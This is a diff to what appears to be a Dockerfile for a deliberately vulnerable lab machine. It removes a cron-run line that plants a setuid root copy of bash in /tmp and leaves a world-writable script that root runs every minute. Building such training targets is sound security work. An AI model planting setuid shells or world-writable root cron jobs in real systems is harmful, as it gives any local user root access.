@@ -47,7 +47,7 @@ RUN mkdir -p /srv/ftp/files && \
 RUN echo "* * * * * root /usr/local/bin/backup.sh" > /etc/cron.d/rootjob && \
     chmod 644 /etc/cron.d/rootjob && \
     echo '#!/bin/bash' > /usr/local/bin/backup.sh && \
-    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh && \
+    echo 'tar czf /tmp/backup.tar.gz /home/oramiuser 2>/dev/null' >> /usr/local/bin/backup.sh && \
     chmod 777 /usr/local/bin/backup.sh
 
 # Banner
